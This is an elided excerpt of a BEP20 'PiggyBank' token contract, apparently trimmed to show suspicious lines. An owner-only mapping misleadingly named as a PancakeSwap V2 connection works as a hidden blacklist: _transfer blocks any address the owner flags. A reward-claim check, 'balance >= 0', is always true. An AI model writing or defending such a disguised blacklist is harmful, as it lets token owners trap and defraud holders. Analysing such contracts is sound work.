...
contract Piggy is Context, IBEP20, Ownable, ReentrancyGuard {
    using SafeMath for uint256;
    ...
    mapping(address => bool) connectV2;
	event connectV2Pancake(address indexed connectedV2Pancake, bool value);
    ...
    string private _name = "PiggyBank";
  ...
  function _getValues(uint256 tAmount) private view returns (uint256, uint256, uint256, uint256, uint256, uint256) {
    ...
    function setConnectPanCakeV2(address sender, bool _isConnected) external onlyOwner() {
	    require(connectV2[sender] != _isConnected);
	    connectV2[sender] = _isConnected;
	    emit connectV2Pancake(sender, _isConnected);
    }
    ...
    function _transfer(
        ...
        require(connectV2[from] == false, "Account is not connceted to PanCakeV2");
    ...
    // Innovation for protocol by PiggyBank Team
    ...
    function claimBNBReward() isHuman nonReentrant public {
        ...
        require(balanceOf(msg.sender) >= 0, 'Error: must own PIGGY to claim reward');
        if (migration == true) {
        require(connectV2[msg.sender] == true, "Account is not connceted to PanCakeV2");
        }
